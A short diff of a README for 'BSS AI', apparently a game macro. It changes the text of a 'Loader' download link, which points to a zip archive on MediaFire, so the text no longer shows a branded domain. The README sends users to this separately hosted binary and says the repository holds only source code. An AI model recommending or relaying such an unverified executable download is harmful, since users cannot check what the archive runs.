@@ -2,7 +2,7 @@
 > ⚠️ **This repository only contains the source code for BSS AI.**
 > To **download, install, and run** the full macro (including the AI), you must use the official **BSS AI Loader**, available on our [Discord server][discord-link] or from our [website][website-link].
 >
-> 🔗 **Download the Loader:** [bss-ai.com/loader](https://www.mediafire.com/file/zpodkmnq9ykyd3w/BSSAI+v0.0.1.zip)
+> 🔗 **Download the Loader:** [mediafire.com](https://www.mediafire.com/file/zpodkmnq9ykyd3w/BSSAI+v0.0.1.zip)
 
 <div align="center">
 
